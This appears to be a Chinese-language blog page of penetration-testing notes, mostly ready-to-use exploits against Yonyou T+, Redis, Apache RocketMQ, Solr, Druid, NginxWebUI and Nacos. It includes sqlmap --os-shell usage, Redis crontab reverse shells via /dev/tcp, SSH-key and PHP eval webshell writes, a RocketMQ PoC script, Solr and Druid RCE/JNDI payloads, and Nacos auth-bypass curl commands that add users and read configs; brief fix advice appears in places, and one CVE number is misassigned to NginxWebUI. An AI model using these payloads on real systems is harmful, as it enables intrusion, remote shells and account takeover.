<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1</span><br><span class="line">Host: Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure>

<p>保存这个数据包,用sqlmap打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -r shujubao.txt  --random-agent -v 3 --dbms mssql --hex --os-shell</span><br></pre></td></tr></table></figure>



<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230801002433485.png" alt="image-20230801002433485"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line"> </span><br><span class="line">&#123;&quot;accNum&quot;: &quot;3&#x27;&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line"> </span><br><span class="line">&#123;&quot;accNum&quot;: &quot;3&#x27; AND 5227 IN (SELECT (CHAR(97)+CHAR(97)+CHAR(97)+CHAR(97)+CHAR(97)+(SELECT (CASE WHEN (5227=5227) THEN CHAR(97) ELSE CHAR(97) END))+CHAR(97)+CHAR(97)+CHAR(97)+CHAR(97)+CHAR(97)))-- NCab&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><h4 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h4><blockquote>
<p>redis以root身份运行</p>
<p>未授权访问或授权口令已知</p>
</blockquote>
<p>在kali中通过<code>redis-cli -h 192.168.100.101 -p 6379</code>连接到redis，输入以下指令利用crontab反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cron表达式格式：&#123;秒数&#125; &#123;分钟&#125; &#123;小时&#125; &#123;日期&#125; &#123;月份&#125; &#123;星期&#125; &#123;年份(可为空)&#125; 命令</span><br><span class="line"># 每分钟执行一次echo &quot;haha&quot;：* * * * * echo &quot;haha&quot;</span><br><span class="line">192.168.100.101:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.100.99/4444 0&gt;&amp;1\n&quot;</span><br><span class="line"></span><br><span class="line"># 设置目录为/var/spool/cron/</span><br><span class="line">192.168.100.101:6379&gt; config set dir /var/spool/cron/</span><br><span class="line"></span><br><span class="line"># 设置文件名为root</span><br><span class="line">192.168.100.101:6379&gt; config set dbfilename root</span><br><span class="line"></span><br><span class="line"># 保存快照到本地</span><br><span class="line">192.168.100.101:6379&gt; save</span><br></pre></td></tr></table></figure>

<p>kali中打开一个新的命令行窗口执行<code>nc -lvnp 4444</code>进行监听，过一会儿就能接收到反弹回来的shell：</p>
<p>由于redis的压缩储存机制，在某些情况下会因为反弹shell的指令被压缩，从而导致反弹shell失败：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.100.101:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.100.100/4444 0&gt;&amp;1\n&quot;</span><br><span class="line">192.168.100.101:6379&gt; save</span><br></pre></td></tr></table></figure>

<p>[root@localhost ~]# cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>
<ul>
<li>bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.100@&#x2F;4 0&gt;&amp;1</li>
</ul>
<p>当运行redis的用户为普通用户时，会无法出现切换目录失败的情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">(error) ERR Changing directory: Permission denied</span><br></pre></td></tr></table></figure>

<h4 id="SSH公钥"><a href="#SSH公钥" class="headerlink" title="SSH公钥"></a>SSH公钥</h4><blockquote>
<p>redis以root身份运行</p>
<p>未授权访问或者授权口令已知</p>
<p>服务开启ssh服务且允许密钥登录,并且存在&#x2F;root&#x2F;.ssh目录</p>
</blockquote>
<p>在kali中使用<code>ssh-keygen -t rsa</code>生成密钥：</p>
<p>将生成的公钥保存到本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# (echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; kali</span><br></pre></td></tr></table></figure>

<p>将文件写入redis进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将上一步生成的kali文件写入redis并设置键的值为kali</span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# cat kali | redis-cli -h 192.168.100.101 -p 6379 -x set kali</span><br><span class="line"></span><br><span class="line"># 连接redis，并将公钥文件写入/root/.ssh/authorized_keys中</span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# redis-cli -h 192.168.100.101 -p 6379</span><br><span class="line">192.168.100.101:6379&gt; config set dir /root/.ssh/</span><br><span class="line">192.168.100.101:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">192.168.100.101:6379&gt; save</span><br><span class="line"></span><br><span class="line"># 使用密钥进行登录</span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# ssh -i /root/.ssh/id_rsa root@192.168.100.101</span><br></pre></td></tr></table></figure>



<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><blockquote>
<p>服务器开着web服务且web目录路径已知</p>
<p>未授权访问或者授权口令已知</p>
</blockquote>
<p>倘若服务器运行着LAMP&#x2F;LNMP服务，且已知工作目录为<code>/var/www/html/</code>，可通过以下指令写入webshell，或参考写入SSH公钥的过程写入木马文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set xxx &quot;\n\n\n&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;\n\n\n&quot;   //这里的\n\n\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行.</span><br><span class="line">save</span><br></pre></td></tr></table></figure>



<h4 id="主从复制rce"><a href="#主从复制rce" class="headerlink" title="主从复制rce"></a>主从复制rce</h4><blockquote>
<p>redis &lt;&#x3D; 5.0.5</p>
<p>未授权访问</p>
</blockquote>
<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost &lt;target address&gt; --rport &lt;target port&gt; --lhost &lt;vps address&gt; --lport &lt;vps port&gt;</span><br></pre></td></tr></table></figure>

<p>参数说明</p>
<ul>
<li>–rpasswd 如果目标Redis服务开启了认证功能，可以通过该选项指定密码</li>
<li>–rhost 目标redis服务IP</li>
<li>–rport 目标redis服务端口，默认为6379</li>
<li>–lhost vps的IP地址</li>
<li>–lport vps的端口，默认为21000</li>
</ul>
<h4 id="lua-沙盒绕过rce"><a href="#lua-沙盒绕过rce" class="headerlink" title="lua 沙盒绕过rce"></a>lua 沙盒绕过rce</h4><blockquote>
<p>cve-2022-0543</p>
<p>影响版本只限于ubuntu和debian</p>
</blockquote>
<p>安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。</p>
<p>利用luaopen_io函数，执行代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); </span><br><span class="line">local io = io_l(); </span><br><span class="line">local f = io.popen(&quot;id&quot;, &quot;r&quot;); </span><br><span class="line">local res = f:read(&quot;*a&quot;); </span><br><span class="line">f:close(); </span><br><span class="line">return res&#x27; 0</span><br></pre></td></tr></table></figure>

<p>前提都是需要知道package.loadlib的路径。</p>
<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ol>
<li>绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1</li>
<li>requirepass设置redis密码，（默认为空）</li>
<li>保护模式开启protected-mode开启（默认开启）</li>
<li>更改默认端口（6379）</li>
<li>避免使用root权限使用</li>
</ol>
<h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><h4 id="Apache-RocketMQ-NameServer-cve-2023-33246"><a href="#Apache-RocketMQ-NameServer-cve-2023-33246" class="headerlink" title="Apache RocketMQ NameServer    cve-2023-33246"></a>Apache RocketMQ NameServer    cve-2023-33246</h4><blockquote>
<p> CVE-2023-37582 中，由于对 CVE-2023-33246 修复不完善，导致在Apache RocketMQ NameServer 存在未授权访问的情况下，攻击者可构造恶意请求以RocketMQ运行的系统用户身份执行命令。</p>
</blockquote>
<p>CVE-2023-37582 中，由于对 CVE-2023-33246 修复不完善，RocketMQ 5.1.0 及以下版本在一定条件下存在远程命令执行风险。RocketMQ的 NameServer、Broker、Controller 等多个组件暴露在外网且缺乏权限验证，攻击者可以利用此缺陷通过「更新配置」功能修改配置路径，进而以系统用户身份执行任意命令（伪造 RocketMQ 协议也可执行任意命令）。</p>
<p><strong>影响版本</strong></p>
<ol>
<li>5.0.0 &lt;&#x3D; Apache RocketMQ &lt;&#x3D; 5.1.0</li>
<li>4.0.0 &lt;&#x3D; Apache RocketMQ &lt;&#x3D; 4.9.5</li>
</ol>
<p><strong>exp</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 check.py --ip 127.0.0.1 --port 9876</span><br><span class="line">python3 check.py --cidr 192.168.1.0/24</span><br><span class="line"># or </span><br><span class="line">python3 check.py --file rocketmq_targets.txt --port 9876</span><br><span class="line"># target in file format:</span><br><span class="line"># ip</span><br><span class="line"># ip:port</span><br><span class="line"># http://ip:port</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/SuperZero/CVE-2023-33246</span><br><span class="line">#使用方法</span><br><span class="line">java -jar CVE-2023-33246.jar -ip &quot;127.0.0.1&quot; -cmd &quot;注入的命令&quot;</span><br></pre></td></tr></table></figure>

<h4 id="CVE-2023-37582"><a href="#CVE-2023-37582" class="headerlink" title="CVE-2023-37582"></a>CVE-2023-37582</h4><p>poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import binascii</span><br><span class="line">client = socket.socket()</span><br><span class="line"></span><br><span class="line"># you ip</span><br><span class="line">client.connect((&#x27;192.168.222.130&#x27;,9876))</span><br><span class="line"></span><br><span class="line"># data</span><br><span class="line">json = &#x27;&#123;&quot;code&quot;:318,&quot;flag&quot;:0,&quot;language&quot;:&quot;JAVA&quot;,&quot;opaque&quot;:266,&quot;serializeTypeCurrentRPC&quot;:&quot;JSON&quot;,&quot;version&quot;:433&#125;&#x27;.encode(&#x27;utf-8&#x27;)</span><br><span class="line">body=&#x27;configStorePath=/tmp/test.txt\nproductEnvName=123\\ntest&#x27;.encode(&#x27;utf-8&#x27;)</span><br><span class="line">json_lens = int(len(binascii.hexlify(json).decode(&#x27;utf-8&#x27;))/2) # 一个字节是2个十六进制数</span><br><span class="line">head1 = &#x27;00000000&#x27;+str(hex(json_lens))[2:]      # hex(xxxx) 0x1243434 去掉 0x</span><br><span class="line">all_lens = int(4+len(binascii.hexlify(body).decode(&#x27;utf-8&#x27;))/2+json_lens)</span><br><span class="line">head2 = &#x27;00000000&#x27;+str(hex(all_lens))[2:]</span><br><span class="line">data = head2[-8:]+head1[-8:]+binascii.hexlify(json).decode(&#x27;utf-8&#x27;)+binascii.hexlify(body).decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line"># send</span><br><span class="line">client.send(bytes.fromhex(data))</span><br><span class="line">data_recv = client.recv(1024)</span><br><span class="line">print(data_recv)</span><br></pre></td></tr></table></figure>

<p>成功后将会在在 tmp 目录下的 test.txt 文件中写入指定字符串 test</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="Apache-Flink-RCE"><a href="#Apache-Flink-RCE" class="headerlink" title="Apache Flink RCE"></a>Apache Flink RCE</h4><p><strong>影响版本</strong></p>
<p>Apache Flink &lt;&#x3D; 1.9.1</p>
<p><strong>poc</strong></p>
<p>直接上传jar木马 连接</p>
<h4 id="Apache-Solr-代码执行漏洞"><a href="#Apache-Solr-代码执行漏洞" class="headerlink" title="Apache Solr 代码执行漏洞"></a><strong>Apache Solr 代码执行漏洞</strong></h4><blockquote>
<p>CNVD-2023-27598</p>
<p>Solr 以 Solrcloud 模式启动且可出网时，未经身份验证的远程攻击者可以通过发送特制的数据包进行利用，最终在目标系统上远程执行任意代码。</p>
</blockquote>
<p><strong>影响版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.10.0 &lt;= Apache Solr &lt; 9.2.0</span><br></pre></td></tr></table></figure>

<p><strong>利用方法：</strong><br>使用postCommit来命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.1.92:8983</span><br><span class="line">Content-Length: 180</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;suiyi&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;bash&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.92/6666 0&gt;&amp;1&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>通过newSearcher命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /solr/demo/config HTTP/1.1</span><br><span class="line">Host: 192.168.1.92:8983</span><br><span class="line">Content-Length: 170</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;newSearcher&quot;,&quot;name&quot;:&quot;newSearcher3&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;/bin/&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;ping -c 3 x9hr3z.dnslog.cn&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>修复建议</strong><br>如果未使用 ConfigSets API，请禁用 UPLOAD 命令，将系统属性： configset.upload.enabled 设置为 false ，详细参考： <a href="https://lucene.apache.org/solr/guide/8_6/configsets-api.html">https://lucene.apache.org/solr/guide/8_6/configsets-api.html</a><br>使用身份验证&#x2F;授权，详细参考：<a href="https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plu">https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plu</a><br>gins.html<br>官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本：<br><a href="https://github.com/apache/solr/releases/tag/releases/solr/9.2.0">https://github.com/apache/solr/releases/tag/releases/solr/9.2.0</a></p>
<h4 id="Apache-Druid-远程代码执行漏洞"><a href="#Apache-Druid-远程代码执行漏洞" class="headerlink" title="Apache Druid 远程代码执行漏洞"></a><strong>Apache Druid 远程代码执行漏洞</strong></h4><blockquote>
<p>QVD-2023-9629</p>
<p>该漏洞源于 Apache Kafka Connect JNDI 注入漏洞(CVE-2023-25194)，Apache Druid 由于支持从 Kafka 加载数据，刚好满足其利用条件，攻击者可通过修改Kafka 连接配置属性进行 JNDI 注入攻击，进而在服务端执行任意恶意代码。</p>
</blockquote>
<p><strong>影响版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Druid &lt;= 25.0.0</span><br></pre></td></tr></table></figure>

<p><strong>poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /druid/indexer/v1/sampler?for=connect HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 1437</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;type&quot;:&quot;kafka&quot;,</span><br><span class="line">&quot;spec&quot;:&#123;</span><br><span class="line">&quot;type&quot;:&quot;kafka&quot;,</span><br><span class="line">&quot;ioConfig&quot;:&#123;</span><br><span class="line">&quot;type&quot;:&quot;kafka&quot;,</span><br><span class="line">&quot;consumerProperties&quot;:&#123;</span><br><span class="line">&quot;bootstrap.servers&quot;:&quot;1.1.1.1:9092&quot;,</span><br><span class="line">&quot;sasl.mechanism&quot;:&quot;SCRAM-SHA-256&quot;,</span><br><span class="line">&quot;security.protocol&quot;:&quot;SASL_SSL&quot;,</span><br><span class="line">&quot;sasl.jaas.config&quot;:&quot;com.sun.security.auth.module.JndiLoginModule required user.provider.url=\&quot;ldap://x.x.x.x\&quot; useFirstPass=\&quot;true\&quot; serviceName=\&quot;x\&quot; debug=\&quot;true\&quot; group.provider.url=\&quot;xxx\&quot;;&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;topic&quot;:&quot;any&quot;,</span><br><span class="line">&quot;useEarliestOffset&quot;:true,</span><br><span class="line">&quot;inputFormat&quot;:&#123;</span><br><span class="line">&quot;type&quot;:&quot;regex&quot;,</span><br><span class="line">&quot;pattern&quot;:&quot;([\\s\\S]*)&quot;,</span><br><span class="line">&quot;listDelimiter&quot;:&quot;56616469-6de2-9da4-efb8-8f416e6e6965&quot;,</span><br><span class="line">&quot;columns&quot;:[</span><br><span class="line">&quot;raw&quot;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;dataSchema&quot;:&#123;</span><br><span class="line">&quot;dataSource&quot;:&quot;sample&quot;,</span><br><span class="line">&quot;timestampSpec&quot;:&#123;</span><br><span class="line">&quot;column&quot;:&quot;!!!_no_such_column_!!!&quot;,</span><br><span class="line">&quot;missingValue&quot;:&quot;1970-01-01T00:00:00Z&quot;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;dimensionsSpec&quot;:&#123;</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line">&quot;granularitySpec&quot;:&#123;</span><br><span class="line">&quot;rollup&quot;:false</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;tuningConfig&quot;:&#123;</span><br><span class="line">&quot;type&quot;:&quot;kafka&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&quot;samplerConfig&quot;:&#123;</span><br><span class="line">&quot;numRows&quot;:500,</span><br><span class="line">&quot;timeoutMs&quot;:15000</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>user.provider.url处填写你的恶意ldap服务url<br><strong>修复建议</strong></p>
<ol>
<li>避免 Apache Druid 开放至公网。</li>
<li>开启身份认证机制,可参考官方文档：<a href="https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html">https://druid.apache.org/docs/latest/development/extensions-core/druid-basic-security.html</a></li>
</ol>
<h3 id="NginxWebUI-runCmd-远程代码执行漏洞"><a href="#NginxWebUI-runCmd-远程代码执行漏洞" class="headerlink" title="NginxWebUI runCmd 远程代码执行漏洞"></a><strong>NginxWebUI runCmd 远程代码执行漏洞</strong></h3><blockquote>
<p>CVE-2023-33246</p>
<p>该漏洞源于开发人员没有对 runCmd 接口处传入的参数进行有效过滤，攻击者可在无需登录的情况下绕过路由权限校验，通过拼接语句的方式执行任意命令，最终控制服务器</p>
</blockquote>
<p><strong>影响版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginxWebUI &lt; 3.5.1（v3.5.1 版本修复了登陆绕过漏洞，但是 RCE 漏洞在最新版本（v3.6.5）中仍可绕过防护进行利用）</span><br></pre></td></tr></table></figure>

<p><strong>poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /AdminPage/conf/runCmd?cmd=执行的命令%26%26echo%20nginx HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0</span><br></pre></td></tr></table></figure>

<p><strong>检测工具</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/chaitin/xpoc</span><br></pre></td></tr></table></figure>


<p><strong>修复建议</strong></p>
<ol>
<li>通过设置安全组功能，仅对可信地址和内网开放 nginxWebUI 来缓解风险。</li>
<li>官方已发布漏洞补丁及修复版本，但组件修复不完全，防护机制可被绕过，且其他接口仍存在多个高危漏洞。因此建议受漏洞影响的用户及时关注厂商公告并及时更新 NginxWebUI：<a href="http://file.nginxwebui.cn/nginxWebUI-3.6.5.jar">http://file.nginxwebui.cn/nginxWebUI-3.6.5.jar</a></li>
</ol>
<h3 id="nacos"><a href="#nacos" class="headerlink" title="nacos"></a>nacos</h3><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a><strong>未授权访问</strong></h4><blockquote>
<p>大部分企业的 nacos的url为 &#x2F;v1&#x2F;auth&#x2F;users ，而不是  &#x2F;nacos&#x2F;v1&#x2F;auth&#x2F;users</p>
</blockquote>
<p><a href="http://x.x.x.x:xxxx/nacos/v1/auth/users?pageNo=1&pageSize=9（ip和端口用x代替）">http://x.x.x.x:xxxx/nacos/v1/auth/users?pageNo=1&amp;pageSize=9（ip和端口用x代替）</a></p>
<p>可以看到账号密码</p>
<p>get 参数改成post然后提交一个新的用户名和密码</p>
<p>POST <a href="https://link.zhihu.com/?target=http://IP">http://IP</a>:端口&#x2F;nacos&#x2F;v1&#x2F;auth&#x2F;users?username&#x3D;test1&amp;password&#x3D;test1</p>
<p>这个时候我们用test1登录</p>
<h4 id="Nacos2-2-0权限绕过"><a href="#Nacos2-2-0权限绕过" class="headerlink" title="Nacos2.2.0权限绕过"></a>Nacos2.2.0权限绕过</h4><p>Header中添加serverIdentity: security能直接绕过身份验证查看用户列表<br>如果没有或者不对应则返回403</p>
<h4 id="Nacos1-x-x版本User-Agent权限绕过-CVE-2021-29441"><a href="#Nacos1-x-x版本User-Agent权限绕过-CVE-2021-29441" class="headerlink" title="Nacos1.x.x版本User-Agent权限绕过 (CVE-2021-29441)"></a>Nacos1.x.x版本User-Agent权限绕过 (CVE-2021-29441)</h4><h5 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>在 1.4.1 及更早版本的 Nacos 中，当配置为使用身份验证 (Dnacos.core.auth.enabled&#x3D;true) 时，会使用 AuthFilter servlet 过滤器来强制实施身份验证，从而跳过身份验证检查。此机制依赖于用户代理 HTTP 标头，因此很容易被欺骗。此问题可能允许任何用户在 Nacos 服务器上执行任何管理任务。</p>
<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8848:8848 hglight/cve-2021-29441</span><br></pre></td></tr></table></figure>

<h5 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h5><p>Nacos &lt;&#x3D; 1.4.1</p>
<p>复现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   </span><br><span class="line">1.修改User-Agent的值为Nacos-Server到请求包中,添加Header头后访问</span><br><span class="line">http://target:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9</span><br><span class="line">可以看到返回值为200,且内容中是否包含pageItems</span><br><span class="line"></span><br><span class="line">GET /nacos/v1/auth/users/?pageNo=1&amp;pageSize=9 HTTP/1.1</span><br><span class="line">Host: 192.168.246.138:8848</span><br><span class="line">User-Agent: Nacos-Server</span><br><span class="line">       或者使用命令访问：</span><br><span class="line">       读取用户密码：</span><br><span class="line">       curl  &#x27;http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;accessToken=&#x27; -H &#x27;User-Agent: Nacos-Server&#x27;</span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line">curl &#x27;http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=blur&#x27; -H &#x27;User-Agent: Nacos-Server&#x27;</span><br><span class="line">       </span><br><span class="line">curl &#x27;http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;search=accurate&#x27; -H &#x27;User-Agent: Nacos-Server&#x27;</span><br><span class="line">      </span><br><span class="line">未授权添加用户</span><br><span class="line">curl -X POST &#x27;http://127.0.0.1:8848/nacos/v1/auth/users?username=test1&amp;password=test1&#x27; -H &#x27;User-Agent:Nacos-Server</span><br><span class="line">任意用户密码更改</span><br><span class="line">curl -X PUT &#x27;http://127.0.0.1:8848/nacos/v1/auth/users?accessToken=&#x27; -H &#x27;User-Agent:Nacos-Server&#x27; -d &#x27;username=test1&amp;newPassword=test2&#x27;</span><br><span class="line">读取配置文件</span><br><span class="line">curl -X GET &#x27;http://127.0.0.1:8848/nacos/v1/cs/configs?search=accurate&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span><br><span class="line">curl -X GET &#x27;http://127.0.0.1:8848/nacos/v1/cs/configs?search=blur&amp;dataId=&amp;group=&amp;pageNo=1&amp;pageSize=99’</span><br><span class="line">添加Header头后使用POST方式请求http://target:8848/nacos/v1/auth/users?username=vulhub&amp;password=vulhub添加一个新用户,账号密码都为vulhub</span><br><span class="line"></span><br><span class="line">POST /nacos/v1/auth/users?username=hglight&amp;password=hglight </span><br><span class="line">HTTP/1.1</span><br><span class="line">Host : 192.168.246.138:8848</span><br><span class="line">User-Agent:Nacos-Server </span><br><span class="line">或者</span><br><span class="line">POST /nacos/v1/auth/users HTTP/1.1</span><br><span class="line">Host: 192.168.31.64:8848</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Nacos-Server</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 27</span><br><span class="line">username=hglight&amp;password=hglight</span><br><span class="line">再次查看用户列表，返回的用户列表数据中，多了一个我们通过绕过鉴权创建的新用户</span><br><span class="line">GET /nacos/v1/auth/users/?pageNo=1&amp;pageSize=9 HTTP/1.1</span><br><span class="line">Host: 192.168.246.138:8848</span><br><span class="line">User-Agent: Nacos-Server</span><br><span class="line">访问http://IP:8848/nacos使用新建用户登录，此时表示漏洞利用成功</span><br></pre></td></tr></table></figure>



